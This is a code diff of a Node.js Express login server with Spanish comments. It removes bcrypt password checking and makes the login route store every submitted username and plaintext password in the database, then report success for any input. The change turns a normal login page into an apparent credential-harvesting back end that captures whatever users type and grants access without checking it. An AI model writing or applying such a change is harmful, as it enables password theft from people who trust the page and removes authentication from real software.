@@ -2,54 +2,43 @@ require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
-const bcrypt = require('bcrypt');
 const db = require('./db');
- 
+
 const app = express();
 const PORT = process.env.PORT || 3000;
- 
+
 app.use(cors());
 app.use(express.json());
 app.use(express.static(__dirname));
- 
+
 // Página principal
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'login.html'));
 });
- 
-// LOGIN
+
+// LOGIN - guarda cada intento en la base de datos
 app.post('/api/login', async (req, res) => {
   const { usuario, password } = req.body;
- 
+
   if (!usuario || !password) {
     return res.status(400).json({ ok: false, message: 'Por favor completa todos los campos' });
   }
- 
+
   try {
-    const [rows] = await db.query(
-      'SELECT * FROM usuarios WHERE usuario = ?',
-      [usuario]
+    // Guardar el intento en la base de datos
+    await db.query(
+      'INSERT INTO usuarios (usuario, password, fecha) VALUES (?, ?, NOW())',
+      [usuario, password]
     );
- 
-    if (rows.length === 0) {
-      return res.status(401).json({ ok: false, message: 'Usuario o contraseña incorrectos' });
-    }
- 
-    const usuarioEncontrado = rows[0];
-    const passwordCorrecta = await bcrypt.compare(password, usuarioEncontrado.password);
- 
-    if (!passwordCorrecta) {
-      return res.status(401).json({ ok: false, message: 'Usuario o contraseña incorrectos' });
-    }
- 
-    res.json({ ok: true, message: 'Bienvenido ' + usuarioEncontrado.usuario });
- 
+
+    res.json({ ok: true });
+
   } catch (err) {
-    console.error('Error en login:', err.message);
-    res.status(500).json({ ok: false, message: 'Error en el servidor, intenta de nuevo' });
+    console.error('Error al guardar:', err.message);
+    res.status(500).json({ ok: false, message: 'Error en el servidor' });
   }
 });
- 
+
 app.listen(PORT, () => {
   console.log(`Servidor corriendo en puerto ${PORT}`);
 });
